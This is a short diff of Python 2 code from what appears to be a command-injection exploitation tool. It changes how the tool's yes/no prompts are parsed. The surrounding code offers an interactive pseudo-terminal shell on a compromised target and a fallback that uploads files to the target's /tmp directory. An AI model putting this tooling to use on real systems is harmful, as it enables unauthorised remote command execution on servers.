@@ -139,7 +139,6 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	    html_data = output.read()
 	    shell = re.findall(r""+TAG+"", html_data)
 	    
-	  # If temp-based technique failed, use the "/tmp/" directory for tempfile-based technique.
 	  except urllib2.HTTPError, e:
 	      if e.getcode() == 404 :
 		  continue
@@ -214,8 +213,8 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	  fb_enumeration.do_check(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,delay)
 	      
 	  # Pseudo-Terminal shell
-	  gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
-	  if gotshell == "Y" or gotshell == "y":
+	  gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
+	  if gotshell in settings.CHOISE_YES:
 	    print ""
 	    print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
 	    while True:
@@ -241,7 +240,9 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	    
 	  else:
 	    pass
-
+	  
+  # If temp-based technique failed, 
+  # use the "/tmp/" directory for tempfile-based technique.
   if no_result == True:
     if menu.options.verbose == False:
       print "[" + colors.RED + " FAILED "+colors.RESET+"]"
@@ -251,8 +252,8 @@ def fb_injection_handler(url,delay,filename,http_request_method):
       tmp_path = menu.options.tmp_path
     else:
       tmp_path = settings.TMP_PATH
-    tmp_upload = raw_input("(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ")
-    if tmp_upload == "Y" or tmp_upload == "y":
+    tmp_upload = raw_input("(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
+    if tmp_upload in settings.CHOISE_YES:
       sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
       tfb_handler.exploitation(url,delay,filename,tmp_path,http_request_method)     
     else:
